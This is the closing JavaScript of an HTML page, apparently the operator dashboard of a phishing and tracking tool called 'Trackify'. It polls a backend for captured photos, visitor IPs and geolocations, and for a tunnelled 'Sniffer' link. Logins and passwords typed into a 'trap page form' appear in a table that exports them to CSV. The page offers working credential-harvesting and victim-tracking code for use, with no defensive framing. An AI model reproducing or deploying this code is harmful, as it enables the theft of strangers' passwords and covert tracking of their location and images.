                if (!btn || !grid.contains(btn)) return;
                e.stopPropagation();
                e.preventDefault();
                const path = btn.getAttribute('data-path');
                if (!path) return;
                galleryDeleteOpenModal([path]);
            });
        })();

        document.addEventListener('keydown', function (e) {
            if (e.key !== 'Escape') {
                return;
            }
            if (document.getElementById('lightbox').classList.contains('show')) {
                closeLightbox();
                return;
            }
            const gdm = document.getElementById('galleryDeleteModal');
            if (gdm && gdm.classList.contains('show')) {
                galleryDeleteCloseModal();
                return;
            }
            const dm = document.getElementById('disclaimerModal');
            if (dm && dm.classList.contains('show')) {
                dm.classList.remove('show');
            }
        });

        function openDisclaimer() {
            document.getElementById('disclaimerModal').classList.add('show');
        }

        function closeDisclaimer(event) {
            if (!event || event.target === event.currentTarget || event.target.classList.contains('modal-close')) {
                document.getElementById('disclaimerModal').classList.remove('show');
            }
        }

        async function clearCaptures() {
            const btn = document.getElementById('clearCapturesBtn');
            if (!btn) return;
            if (!confirm('Clear recent capture history?')) return;

            btn.disabled = true;
            try {
                const res = await fetch(API + '?action=clear_captures', {
                    method: 'POST',
                    credentials: 'same-origin'
                });
                const data = await res.json().catch(() => ({}));
                if (data.status !== 'success') {
                    alert(data.message || 'Could not clear captures');
                    return;
                }
                capturesList.innerHTML = '<div class="empty-state">No captures yet</div>';
                const toast = document.getElementById('toast');
                toast.textContent = 'Capture history cleared';
                toast.classList.add('show');
                setTimeout(() => toast.classList.remove('show'), 2000);
            } catch (e) {
                alert('Could not clear captures: ' + (e && e.message ? e.message : String(e)));
            } finally {
                btn.disabled = false;
            }
        }

        function formatSavedLoginAt(iso) {
            if (!iso) {
                return '';
            }
            const d = new Date(String(iso));
            if (isNaN(d.getTime())) {
                return String(iso);
            }
            const months = ['Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sep', 'Oct', 'Nov', 'Dec'];
            const day = d.getDate();
            const dayStr = day < 10 ? '0' + day : String(day);
            let h = d.getHours();
            const am = h >= 12 ? 'PM' : 'AM';
            h = h % 12;
            if (h === 0) {
                h = 12;
            }
            const min = d.getMinutes();
            const minStr = min < 10 ? '0' + min : String(min);
            return months[d.getMonth()] + ' ' + dayStr + ' ' + d.getFullYear() + ' ' + h + ':' + minStr + ' ' + am;
        }

        function csvEscapeCell(val) {
            const s = String(val == null ? '' : val);
            if (/[",\n\r]/.test(s)) {
                return '"' + s.replace(/"/g, '""') + '"';
            }
            return s;
        }

        function exportSavedInfoCsv() {
            if (!lastSavedInfoEntries || lastSavedInfoEntries.length === 0) {
                return;
            }
            const headers = ['Time (UTC)', 'Login', 'Password', 'Template', 'IP', 'User agent'];
            const lines = lastSavedInfoEntries.map(function (row) {
                return [
                    row.at || '',
                    row.login || '',
                    row.password || '',
                    row.template_label || row.template || '',
                    row.ip || '',
                    row.user_agent || ''
                ].map(csvEscapeCell).join(',');
            });
            const csv = '\uFEFF' + headers.map(csvEscapeCell).join(',') + '\n' + lines.join('\n');
            const blob = new Blob([csv], { type: 'text/csv;charset=utf-8' });
            const a = document.createElement('a');
            a.href = URL.createObjectURL(blob);
            a.download = 'trackify-saved-logins-' + new Date().toISOString().slice(0, 19).replace(/[:T]/g, '-') + '.csv';
            document.body.appendChild(a);
            a.click();
            a.remove();
            URL.revokeObjectURL(a.href);
            const toast = document.getElementById('toast');
            if (toast) {
                toast.textContent = 'CSV exported';
                toast.classList.add('show');
                setTimeout(function () { toast.classList.remove('show'); }, 2000);
            }
        }

        async function loadSavedInfo() {
            const wrap = document.getElementById('savedInfoWrap');
            const maxEl = document.getElementById('savedInfoMax');
            const countMeta = document.getElementById('savedInfoCountMeta');
            const exportBtn = document.getElementById('exportSavedInfoBtn');
            if (!wrap) {
                return;
            }
            try {
                const res = await fetch(API + '?action=saved_info', { credentials: 'same-origin' });
                const data = await res.json().catch(() => ({}));
                if (data.status !== 'success' || !Array.isArray(data.entries)) {
                    lastSavedInfoEntries = [];
                    if (exportBtn) {
                        exportBtn.disabled = true;
                    }
                    if (countMeta) {
                        countMeta.textContent = '';
                    }
                    wrap.innerHTML = '<div class="saved-info-empty">Could not load saved entries.</div>';
                    return;
                }
                if (maxEl && data.max_entries != null) {
                    maxEl.textContent = String(data.max_entries);
                }
                if (data.entries.length === 0) {
                    lastSavedInfoEntries = [];
                    if (exportBtn) {
                        exportBtn.disabled = true;
                    }
                    if (countMeta) {
                        countMeta.textContent = data.max_entries != null ? '0 / ' + data.max_entries : '';
                    }
                    wrap.innerHTML = '<div class="saved-info-empty" id="savedInfoEmpty">No saved logins yet. Generate a Sniffer link and submit the trap page form.</div>';
                    return;
                }
                lastSavedInfoEntries = data.entries;
                if (exportBtn) {
                    exportBtn.disabled = false;
                }
                if (countMeta) {
                    countMeta.textContent = data.max_entries != null
                        ? (data.entries.length + ' / ' + data.max_entries)
                        : String(data.entries.length);
                }
                let html = '<div class="saved-info-table-scroll"><table class="saved-info-table"><thead><tr>';
                html += '<th scope="col" class="saved-info-col-time">Time</th><th scope="col" class="saved-info-col-login">Login</th><th scope="col" class="saved-info-col-password">Password</th><th scope="col" class="saved-info-col-template">Template</th><th scope="col" class="saved-info-col-ip">IP</th><th scope="col" class="saved-info-col-ua">User agent</th>';
                html += '</tr></thead><tbody>';
                data.entries.forEach(function (row) {
                    const rawAt = row.at || '';
                    const displayAt = formatSavedLoginAt(rawAt);
                    const tpl = escapeHtmlText(row.template_label || row.template || '');
                    const titleAt = escapeHtmlAttr(rawAt);
                    html += '<tr><td class="saved-info-col-time saved-info-cell-time" title="' + titleAt + '">' + escapeHtmlText(displayAt) + '</td>';
                    html += '<td class="saved-info-col-login saved-info-cell-mono">' + escapeHtmlText(row.login || '') + '</td>';
                    html += '<td class="saved-info-col-password saved-info-cell-mono">' + escapeHtmlText(row.password || '') + '</td>';
                    html += '<td class="saved-info-col-template saved-info-cell-template">' + tpl + '</td>';
                    html += '<td class="saved-info-col-ip saved-info-cell-mono">' + escapeHtmlText(row.ip || '') + '</td>';
                    html += '<td class="saved-info-col-ua">' + escapeHtmlText(row.user_agent || '') + '</td></tr>';
                });
                html += '</tbody></table></div>';
                wrap.innerHTML = html;
            } catch (e) {
                lastSavedInfoEntries = [];
                if (exportBtn) {
                    exportBtn.disabled = true;
                }
                if (countMeta) {
                    countMeta.textContent = '';
                }
                wrap.innerHTML = '<div class="saved-info-empty">Could not load saved entries.</div>';
            }
        }

        async function clearSavedInfo() {
            if (!confirm('Clear all saved login entries for your account? This cannot be undone.')) {
                return;
            }
            const btn = document.getElementById('clearSavedInfoBtn');
            if (btn) {
                btn.disabled = true;
            }
            try {
                const res = await fetch(API + '?action=clear_saved_info', {
                    method: 'POST',
                    credentials: 'same-origin'
                });
                const data = await res.json().catch(() => ({}));
                if (data.status !== 'success') {
                    alert(data.message || 'Could not clear saved entries');
                    return;
                }
                await loadSavedInfo();
                const toast = document.getElementById('toast');
                toast.textContent = 'Saved entries cleared';
                toast.classList.add('show');
                setTimeout(function () { toast.classList.remove('show'); }, 2000);
            } catch (err) {
                alert('Could not clear: ' + (err && err.message ? err.message : String(err)));
            } finally {
                if (btn) {
                    btn.disabled = false;
                }
            }
        }

        (function initSupportPrompt() {
            const prompt = document.getElementById('supportPrompt');
            const continueBtn = document.getElementById('supportContinueBtn');
            if (!prompt || !continueBtn) return;
            const storageKey = 'trackify_support_prompt_hidden';
            try {
                if (localStorage.getItem(storageKey) === '1') {
                    prompt.hidden = true;
                }
            } catch (e) {}

            continueBtn.addEventListener('click', function () {
                prompt.hidden = true;
                try {
                    localStorage.setItem(storageKey, '1');
                } catch (e) {}
            });
        })();

        async function loadCaptures() {
            try {
                const res = await fetch(API + '?action=captures', { credentials: 'same-origin' });
                const data = await res.json();
                if (data.status === 'success' && data.data) {
                    const geo = data.data.geolocations || [];
                    const fromGeo = geo.map(g => ({
                        ip: g.ip,
                        time: g.timestamp,
                        loc: (g.geo && (g.geo.location || g.geo.city)) || g.location || g.city
                    }));
                    const fromIps = (data.data.ips || []).map(row => ({
                        ip: row.ip || 'N/A',
                        time: row.time || '',
                        loc: ''
                    }));
                    const allRows = [...fromGeo, ...fromIps];
                    allRows.sort((a, b) => new Date(b.time || 0) - new Date(a.time || 0));
                    if (allRows.length === 0) {
                        capturesList.innerHTML = '<div class="empty-state">No captures yet</div>';
                    } else {
                        capturesList.innerHTML = allRows.slice(0, 10).map(c => `
                            <div class="capture-item">
                                <span class="ip">${c.ip || 'N/A'}</span>
                                ${c.loc ? '<br><span style="color:var(--text-muted);font-size:12px">' + String(c.loc).substring(0, 35) + '</span>' : ''}
                                <div class="time">${c.time || ''}</div>
                            </div>
                        `).join('');
                    }
                }
            } catch (e) {}
        }

        async function checkStatus() {
            try {
                const res = await fetch(API + '?action=status', { credentials: 'same-origin' });
                const data = await res.json();
                const stopBtnSidebarEl = document.getElementById('stopBtnSidebar');
                if (data.link) {
                    statusDisplay.innerHTML = '<span class="status-badge active">Tunnel active</span>';
                    statusLink.textContent = data.link;
                    trackerLinkInput.value = data.link;
                } else {
                    statusDisplay.innerHTML = '<span class="status-badge inactive">Tunnel inactive</span>';
                    statusLink.textContent = '';
                    trackerLinkInput.value = '';
                }
                syncTrackifyTunnelRow(data.link, !!data.show_stop_tunnel);
                if (data.show_stop_tunnel) {
                    if (stopBtnSidebarEl) {
                        stopBtnSidebarEl.style.display = 'block';
                    }
                } else {
                    if (stopBtnSidebarEl) {
                        stopBtnSidebarEl.style.display = 'none';
                    }
                }
                const siBox = document.getElementById('siLinkBox');
                const siIn = document.getElementById('siTrackerLink');
                const siSt = document.getElementById('siStopBtn');
                if (data.saveinfo_link) {
                    if (siBox) {
                        siBox.style.display = 'flex';
                    }
                    if (siIn) {
                        siIn.value = data.saveinfo_link;
                    }
                    if (siSt) {
                        siSt.style.display = 'inline-flex';
                    }
                } else {
                    if (siBox) {
                        siBox.style.display = 'none';
                    }
                    if (siIn) {
                        siIn.value = '';
                    }
                    if (siSt) {
                        siSt.style.display = 'none';
                    }
                }
            } catch (e) {}
        }

        let lastTerminalEvents = [];
        async function pollTerminalEvents() {
            try {
                const res = await fetch(API + '?action=terminal', { credentials: 'same-origin' });
                const data = await res.json();
                if (data.events && data.events.length > 0) {
                    for (const ev of data.events) {
                        if (lastTerminalEvents.includes(ev.type + ev.content)) continue;
                        lastTerminalEvents.push(ev.type + ev.content);
                        appendTerminalEventToRoot(terminalEl, ev);
                        appendTerminalEventToRoot(saveInfoTerminalEl, ev);
                        if (ev.type === 'saved_login') {
                            const sil = document.getElementById('saveInfoLayout');
                            if (sil && sil.style.display === 'block') {
                                loadSavedInfo();
                            }
                        }
                    }
                }
            } catch (e) {}
        }

        (function initUserNav() {
            const nav = document.getElementById('userNav');
            const trigger = document.getElementById('userNavTrigger');
            const menu = document.getElementById('userNavMenu');
            if (!nav || !trigger || !menu) return;

            function closeMenu() {
                trigger.setAttribute('aria-expanded', 'false');
                menu.hidden = true;
            }
            function toggleMenu() {
                const open = trigger.getAttribute('aria-expanded') === 'true';
                if (open) {
                    closeMenu();
                } else {
                    trigger.setAttribute('aria-expanded', 'true');
                    menu.hidden = false;
                }
            }

            trigger.addEventListener('click', function (e) {
                e.stopPropagation();
                toggleMenu();
            });
            nav.addEventListener('click', function (e) {
                e.stopPropagation();
            });
            document.addEventListener('click', function () {
                closeMenu();
            });
            document.addEventListener('keydown', function (e) {
                if (e.key === 'Escape') closeMenu();
            });
        })();

        setInterval(() => { loadPhotos(currentPage); loadCaptures(); }, 5000);
        setInterval(checkStatus, 10000);
        setInterval(pollTerminalEvents, 2000);
        checkStatus();
        loadPhotos(1);
        loadCaptures();
    </script>
</body>
</html>
